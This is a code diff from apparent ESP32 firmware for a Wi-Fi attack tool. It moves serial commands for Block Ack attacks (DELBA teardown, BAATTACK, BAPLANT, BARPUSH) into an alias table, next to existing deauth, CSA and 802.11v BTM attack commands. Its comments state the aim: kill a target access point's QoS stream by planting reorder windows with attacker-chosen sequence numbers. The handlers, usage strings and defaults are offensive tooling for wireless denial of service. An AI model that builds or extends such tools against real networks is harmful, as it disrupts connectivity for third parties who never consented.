@@ -674,117 +674,11 @@ void do_radio() {
                 radio_owner()[0] != 0 ? radio_owner() : "none", (unsigned)radio_takeovers());
 }
 
-// DELBA <idx> [reason]: tear down the Block Ack sessions of that BSS. Needs the
-// sniffer, so a running deauth/CSA attack is stopped first (one radio, one job).
-void do_delba(int index, uint16_t reason) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    return;
-  }
-  if (!delba_reason_is_defined(reason)) {
-    Serial.println("ERR reason must be one of 1, 32, 37, 38, 39");
-    return;
-  }
-  attack_stop();
-  if (!delba_start(index, reason)) {
-    Serial.println("ERR cannot start DELBA on that network");
-    return;
-  }
-  Serial.printf("OK DELBA %d reason=%u ch=%u ssid=%s\n", index, (unsigned)reason,
-                (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
-  ui_log("delba started");
-}
-
-void do_delba_stop() {
-  const uint32_t frames = delba_frames();
-  delba_stop();
-  Serial.printf("OK DELBASTOP frames=%u\n", (unsigned)frames);
-  ui_log("delba stopped");
-}
-
-void do_delba_test() {
-  delba_selftest();
-}
-
 // BAATTACK <idx> [step]: hijack the Block Ack sessions of one AP by planting its
 // reorder windows. Needs the sniffer, so any running attack is stopped first.
-void do_ba_attack(int index, long step) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    return;
-  }
-  if (step < 0 || step > 2047) {
-    Serial.println("ERR step must be 0..2047 (0..127 = control run, the window is not moved)");
-    return;
-  }
-  attack_stop();
-  if (!delba_start_ba(index, (uint16_t)step)) {
-    Serial.println("ERR cannot start the BA attack on that network");
-    return;
-  }
-  Serial.printf("OK BAATTACK %d step=%ld ch=%u ssid=%s\n", index, step,
-                (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
-  ui_log("ba attack started");
-}
-
-void do_ba_stop() {
-  const uint32_t delba_n = delba_ba_delba_frames();
-  const uint32_t addba_n = delba_ba_addba_frames();
-  const uint32_t bar_n = delba_ba_bar_frames();
-  delba_stop();
-  Serial.printf("OK BASTOP delba=%u addba=%u bar=%u\n", (unsigned)delba_n, (unsigned)addba_n,
-                (unsigned)bar_n);
-  ui_log("ba attack stopped");
-}
-
-void do_ba_test() {
-  delba_ba_selftest();
-}
-
 // BAPLANT <idx> [step]: a few ADDBA frames with an SSN of our choosing, then no
 // more transmission. If the peer's reorder window really moved, its QoS stream
 // stays dead while we are silent.
-void do_bar_push(int index, long step) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    return;
-  }
-  if (step < 0 || step > 2047) {
-    Serial.println("ERR step must be 0..2047 (0..127 = control run)");
-    return;
-  }
-  attack_stop();
-  if (!delba_ba_bar_once(index, (uint16_t)step)) {
-    Serial.println("ERR cannot start the BAR push on that network");
-    return;
-  }
-  Serial.printf("OK BARPUSH %d step=%ld ch=%u\n", index, step, (unsigned)WiFi.channel(index));
-  ui_log("bar push started");
-}
-
-void do_ba_plant(int index, long step) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    return;
-  }
-  if (step < 0 || step > 2047) {
-    Serial.println("ERR step must be 0..2047 (0..127 = control run)");
-    return;
-  }
-  attack_stop();
-  if (!delba_ba_plant_once(index, (uint16_t)step)) {
-    Serial.println("ERR cannot start the BA plant on that network");
-    return;
-  }
-  Serial.printf("OK BAPLANT %d step=%ld ch=%u\n", index, step, (unsigned)WiFi.channel(index));
-  ui_log("ba plant started");
-}
-
-void do_ba_tx() {
-  static const uint8_t probe_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
-  delba_ba_tx_probe(probe_mac);
-}
-
 // ---- 802.11v BTM Request ----
 void do_wnm(int index, char* mode_token, char* timer_token, char* ch_token, char* mac_token) {
   if (index < 0 || index >= g_scan_count) {
@@ -1446,6 +1340,15 @@ const bus_alias_t kBusAliases[] = {
     {"CSA", "csa", "start"},
     {"CSASTOP", "csa", "stop"},
     {"CSATEST", "csa", "test"},
+    {"DELBA", "delba", "start"},
+    {"DELBASTOP", "delba", "stop"},
+    {"DELBATEST", "delba", "test"},
+    {"BAATTACK", "ba", "attack"},
+    {"BAPLANT", "ba", "plant"},
+    {"BARPUSH", "ba", "push"},
+    {"BATX", "ba", "tx"},
+    {"BASTOP", "ba", "stop"},
+    {"BATEST", "ba", "test"},
 };
 
 const bus_alias_t* find_bus_alias(const char* command) {
@@ -1560,59 +1463,11 @@ void dispatch(char* line) {
     if (apply_reason_arg(arg)) do_deauth_list(list, arg.value, true);
   } else if (strcmp(command, "REASON") == 0) {
     do_reason(strtok(nullptr, " \t"));
-  } else if (strcmp(command, "DELBA") == 0) {
-    char* idx_token = strtok(nullptr, " \t");
-    char* reason_token = strtok(nullptr, " \t");
-    const int delba_idx = parse_index(idx_token);
-    if (delba_idx < 0) {
-      Serial.println("ERR usage: DELBA <idx> [reason]");
-    } else {
-      const long reason = reason_token ? strtol(reason_token, nullptr, 10) : 37;
-      do_delba(delba_idx, (uint16_t)reason);
-    }
-  } else if (strcmp(command, "DELBASTOP") == 0) {
-    do_delba_stop();
-  } else if (strcmp(command, "DELBATEST") == 0) {
-    do_delba_test();
-  } else if (strcmp(command, "BAATTACK") == 0) {
-    char* idx_token = strtok(nullptr, " \t");
-    char* step_token = strtok(nullptr, " \t");
-    const int ba_idx = parse_index(idx_token);
-    if (ba_idx < 0) {
-      Serial.println("ERR usage: BAATTACK <idx> [step 128-2047]");
-    } else {
-      const long step = step_token ? strtol(step_token, nullptr, 10) : 512;
-      do_ba_attack(ba_idx, step);
-    }
-  } else if (strcmp(command, "BASTOP") == 0) {
-    do_ba_stop();
-  } else if (strcmp(command, "BATEST") == 0) {
-    do_ba_test();
-  } else if (strcmp(command, "BATX") == 0) {
-    do_ba_tx();
   } else if (strcmp(command, "RESTART") == 0) {
     Serial.println("OK RESTART");
     Serial.flush();
     delay(100);
     esp_restart();
-  } else if (strcmp(command, "BARPUSH") == 0) {
-    char* idx_token = strtok(nullptr, " \t");
-    char* step_token = strtok(nullptr, " \t");
-    const int push_idx = parse_index(idx_token);
-    if (push_idx < 0) {
-      Serial.println("ERR usage: BARPUSH <idx> [step 0-2047]");
-    } else {
-      do_bar_push(push_idx, step_token ? strtol(step_token, nullptr, 10) : 512);
-    }
-  } else if (strcmp(command, "BAPLANT") == 0) {
-    char* idx_token = strtok(nullptr, " \t");
-    char* step_token = strtok(nullptr, " \t");
-    const int plant_idx = parse_index(idx_token);
-    if (plant_idx < 0) {
-      Serial.println("ERR usage: BAPLANT <idx> [step 0-2047]");
-    } else {
-      do_ba_plant(plant_idx, step_token ? strtol(step_token, nullptr, 10) : 512);
-    }
   } else if (strcmp(command, "WNM") == 0) {
     char* idx_token = strtok(nullptr, " \t");
     char* mode_token = strtok(nullptr, " \t");
